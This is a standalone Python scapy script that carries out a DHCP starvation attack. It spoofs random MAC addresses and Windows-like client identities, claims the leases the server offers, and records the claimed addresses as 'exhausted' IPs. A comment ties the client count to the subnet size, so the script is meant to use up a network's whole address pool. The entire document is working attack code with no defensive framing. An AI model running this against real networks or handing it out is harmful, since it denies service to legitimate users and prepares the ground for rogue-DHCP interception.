from scapy.all import *
import random
import threading
import time

# Define constants
NUM_CLIENTS = 2     # Number of clients to simulate (depends on subnet size)
IFACE = "Ethernet"  # Define the interface you are sniffing and sending packets out of

class DHCPClient:
    def __init__(self, iface):
        self.iface = iface
        self.mac = self.get_random_mac()  # Generate a random MAC address
        self.transaction_id = random.randint(1, 900000000)  # Random transaction ID for DHCP
        self.ip_address = None  # Will store the IP address assigned by DHCP
        self.host_name = self.construct_host_name()  # Construct host name based on MAC
        self.param_req_list = [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]
        self.vendor_class_id = "MSFT 5.0"
        hardware_type = '01'
        self.client_id = hardware_type + self.mac.replace(':', '')  # Client ID for DHCP

    def get_random_mac(self):
        """Generate a random MAC address."""
        oui_prefix = "d0:5f:64:"
        mac_suffix = "%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        return oui_prefix + mac_suffix

    def construct_host_name(self):
        """Construct the host name based on the last three octets of the MAC address."""
        mac_str = self.mac.lower()
        mac_last_three_octets = ":".join(mac_str.split(":")[3:])
        return f"MyPC-{mac_last_three_octets}"

    def send_dhcp_discover(self):
        """Send a DHCP Discover packet to find available DHCP servers."""
        discover = (
            Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=[mac2str(self.mac)], xid=self.transaction_id) /
            DHCP(options=[("message-type", "discover"),
                          ("client_id", bytes.fromhex(self.client_id)),
                          ("hostname", self.host_name),
                          ("vendor_class_id", self.vendor_class_id),
                          ("param_req_list", self.param_req_list),
                          "end"])
        )
        sendp(discover, iface=self.iface, verbose=0)

    def handle_dhcp_offer(self, pkt):
        """Handle a DHCP Offer received from a server."""
        if DHCP in pkt and pkt[DHCP].options[0][1] == 2:  # If it's a DHCP Offer
            offered_ip = pkt[BOOTP].yiaddr
            server_ip = pkt[IP].src
            self.ip_address = offered_ip  # Store the offered IP address
            self.send_dhcp_request(offered_ip, server_ip)

    def send_dhcp_request(self, requested_ip, server_ip):
        """Send a DHCP Request packet to claim the offered IP address."""
        request = (
            Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=[mac2str(self.mac)], xid=self.transaction_id) /
            DHCP(options=[("message-type", "request"),
                          ("client_id", bytes.fromhex(self.client_id)),
                          ("requested_addr", requested_ip),
                          ("server_id", server_ip),
                          ("hostname", self.host_name),
                          ("vendor_class_id", self.vendor_class_id),
                          ("param_req_list", self.param_req_list),
                          "end"])
        )
        sendp(request, iface=self.iface, verbose=0)

    def start(self):
        """Start the DHCP process by sending a DHCP Discover packet."""
        self.send_dhcp_discover()

# Global list to track exhausted IP addresses
exhausted_ips = []
exhausted_ips_lock = threading.Lock()

# Global dictionary to track clients by transaction ID
clients_by_xid = {}
clients_by_xid_lock = threading.Lock()

def handle_packet(pkt):
    """Handle incoming packets, specifically looking for DHCP Offers."""
    if DHCP in pkt and pkt[DHCP].options[0][1] == 2:  # If it's a DHCP Offer
        xid = pkt[BOOTP].xid
        with clients_by_xid_lock:
            client = clients_by_xid.get(xid)
        if client:
            client.handle_dhcp_offer(pkt)
            with exhausted_ips_lock:
                exhausted_ips.append(client.ip_address)

def start_clients(num_clients, iface):
    """Start a specified number of DHCP clients."""
    for _ in range(num_clients):
        client = DHCPClient(iface)
        with clients_by_xid_lock:
            clients_by_xid[client.transaction_id] = client
        client.start()
        time.sleep(0.3)  # Slight delay to avoid flooding

if __name__ == "__main__":
    sniff_thread = threading.Thread(target=sniff, kwargs={"filter": "udp and (port 67 or 68)", "prn": handle_packet, "store": 0, "iface": IFACE})
    sniff_thread.start()

    start_clients(NUM_CLIENTS, IFACE)

    sniff_thread.join()
    print("Exhausted IP Addresses:", exhausted_ips)